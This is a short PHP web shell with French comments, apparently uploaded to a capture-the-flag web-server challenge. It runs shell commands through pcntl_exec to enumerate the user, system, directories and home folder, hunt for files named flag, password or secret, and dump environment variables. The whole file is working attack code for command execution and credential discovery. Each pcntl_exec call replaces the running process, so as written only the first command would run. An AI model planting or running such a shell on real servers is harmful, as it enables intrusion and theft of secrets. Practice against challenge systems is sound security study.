<?php
echo "=== Server Information ===\n\n";

// Info utilisateur
echo "Current User: ";
pcntl_exec('/bin/sh', array('-c', 'whoami'));
?>

<?php
// Info système
echo "\n=== System Info ===\n";
pcntl_exec('/bin/sh', array('-c', 'uname -a'));
?>

<?php
// Répertoire courant
echo "\n=== Current Directory ===\n";
pcntl_exec('/bin/sh', array('-c', 'pwd'));
?>

<?php
// Arbre du répertoire courant
echo "\n=== Directory Tree (Current) ===\n";
pcntl_exec('/bin/sh', array('-c', 'find . -type f -o -type d | head -50'));
?>

<?php
// Fichiers dans /challenge/web-serveur/ch13/
echo "\n=== Files in /challenge/web-serveur/ch13/ ===\n";
pcntl_exec('/bin/sh', array('-c', 'ls -la /challenge/web-serveur/ch13/'));
?>

<?php
// Fichiers parents
echo "\n=== Files in /challenge/web-serveur/ ===\n";
pcntl_exec('/bin/sh', array('-c', 'ls -la /challenge/web-serveur/'));
?>

<?php
// Cherche un flag
echo "\n=== Search for flag/password ===\n";
pcntl_exec('/bin/sh', array('-c', 'find /challenge -name "*flag*" -o -name "*password*" -o -name "*secret*" 2>/dev/null'));
?>

<?php
// Fichiers du user
echo "\n=== Home directory ===\n";
pcntl_exec('/bin/sh', array('-c', 'ls -la ~/'));
?>

<?php
// Env vars
echo "\n=== Environment Variables ===\n";
pcntl_exec('/bin/sh', array('-c', 'env'));
?>
